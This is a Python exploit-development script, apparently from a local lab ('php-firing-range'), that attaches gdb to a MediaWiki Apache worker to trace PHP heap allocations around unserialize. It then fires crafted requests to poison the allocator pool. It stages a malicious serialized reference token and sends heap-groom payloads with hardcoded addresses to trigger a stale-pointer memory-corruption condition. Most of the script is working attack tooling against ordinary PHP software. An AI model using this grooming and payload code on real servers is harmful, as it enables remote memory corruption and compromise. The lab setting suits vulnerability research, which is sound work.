#!/usr/bin/env python3
"""turn3_march.py - GLM5 turn-3 (1): gdb march-map on the arm64 MW lane.

HOST sudo gdb attaches to a container apache child (host pid; root has
CAP_SYS_PTRACE -> yama=1 satisfied). Breakpoints (runtime = bias+offset,
offsets from nm/disasm of THIS binary):
  _emalloc_large          0x435500   (large-class allocs: d 8216, groom 8196..)
  _emalloc_huge           0x435560   (ps_read 75MB buffers)
  php_var_unserialize_init    0x3be60c
  php_var_unserialize_destroy 0x3c118c
Each hit logs size + RETURNED ptr -> the march table. Phase markers INIT /
DESTROY segment requests. The OOM fatal skips DESTROY (that is the stale
mechanism), so a producer request = INIT ... LARGE/HUGE ... (no DESTROY).

No new containers (host gdb only), target unmodified, loopback-only.
"""
import re
import subprocess
import sys
import time
import uuid

sys.path.insert(0, "lanes/race-618/glm5")
import a3_arm64_mw as A
import matrixbleed as M

CONT = "mediawiki"
OFF_EMALLOC_LARGE = 0x435500
OFF_EMALLOC_HUGE = 0x435560
OFF_INIT = 0x3BE60C
OFF_DESTROY = 0x3C118C


def host_pids():
    out = subprocess.run(["docker", "top", "php-firing-range-mediawiki-1", "-o", "pid"],
                         capture_output=True, text=True, timeout=20,
                         cwd=A.REPO).stdout
    m = {}
    for line in out.strip().splitlines()[1:]:
        h = line.strip()
        if not h:
            continue
        ns = subprocess.run(["grep", "NSpid", f"/proc/{h}/status"],
                            capture_output=True, text=True, timeout=5).stdout
        f = ns.split()
        if len(f) >= 3:
            m[f[-1]] = h
    return m


def child_maps_bias(hostpid):
    maps = open(f"/proc/{hostpid}/maps").read()
    m = re.search(r"([0-9a-f]+)-[0-9a-f]+ r..p 00000000 .*libphp\.so", maps)
    return int(m.group(1), 16) if m else None


def gdb_file(bias, logpath):
    bp = lambda off: f"0x{bias + off:x}"
    return f"""set pagination off
set confirm off
set logging file {logpath}
set logging enabled on
hbreak *{bp(OFF_EMALLOC_LARGE)}
commands
silent
set $sz = $x0
finish
printf "LARGE ret=%p size=%lu\\n", $x0, $sz
continue
end
hbreak *{bp(OFF_EMALLOC_HUGE)}
commands
silent
set $sz = $x0
finish
printf "HUGE ret=%p size=%lu\\n", $x0, $sz
continue
end
hbreak *{bp(OFF_INIT)}
commands
silent
printf "INIT level_before=?\\n"
continue
end
hbreak *{bp(OFF_DESTROY)}
commands
silent
printf "DESTROY\\n"
continue
end
continue
"""


def main():
    print("[*] mapping container<->host pids")
    hp = host_pids()
    print("   ", hp)
    # poison the pool
    for i in range(5):
        s2 = "t3A" + uuid.uuid4().hex[:23]
        assert A.stage_producer_file(s2)
        A.fire(A.mp_body(s2, b"P" * 8193))
    # scan needs the /proc helper (docker run) - BANNED this turn; use
    # stale-detection via d content? Instead: attach gdb to EVERY child and
    # let INIT markers identify; simpler: attach to the FIRST child and fire
    # until it serves (pool drains towards it).
    kids = [c for c in hp if c != "1"]
    target_c, target_h = kids[0], hp[kids[0]]
    bias = child_maps_bias(target_h)
    print(f"[*] gdb target: container child {target_c} (host {target_h}) bias=0x{bias:x}")
    log = "/tmp/march_gdb.log"
    open("/tmp/march.gdb", "w").write(gdb_file(bias, log))
    open(log, "w").close()
    proc = subprocess.Popen(["sudo", "gdb", "-q", "-batch",
                             "-p", target_h, "-x", "/tmp/march.gdb"],
                            stdout=open("/tmp/march_gdb_stdout.log", "w"),
                            stderr=subprocess.STDOUT)
    time.sleep(8)  # attach + bps set
    d = 0xe4d289c76000
    bg = 0xe4d28cbae748
    groom = A.build_groom(d, bg + A.BG_DATA_OFF)
    print("[*] firing producers/consumers until the attached child serves")
    for i in range(14):
        s2 = "t3B" + uuid.uuid4().hex[:23]
        assert A.stage_producer_file(s2)
        r1 = A.fire(A.mp_body(s2, b"P" * 8193))
        s3 = "t3C" + uuid.uuid4().hex[:25]
        assert A.stage_token_file(s3, b"k|a:1:{i:0;R:1;}")
        r2 = A.fire(A.mp_body(s3, groom))
        served = open(log).read().count("INIT")
        print(f"  [{i}] prod={len(r1)}B cons={len(r2)}B INITs_seen={served}")
        if served >= 2:
            time.sleep(1)
            break
    time.sleep(2)
    proc.terminate()
    try:
        proc.wait(timeout=10)
    except subprocess.TimeoutExpired:
        proc.kill()
    print(open(log).read()[-4000:])


if __name__ == "__main__":
    main()
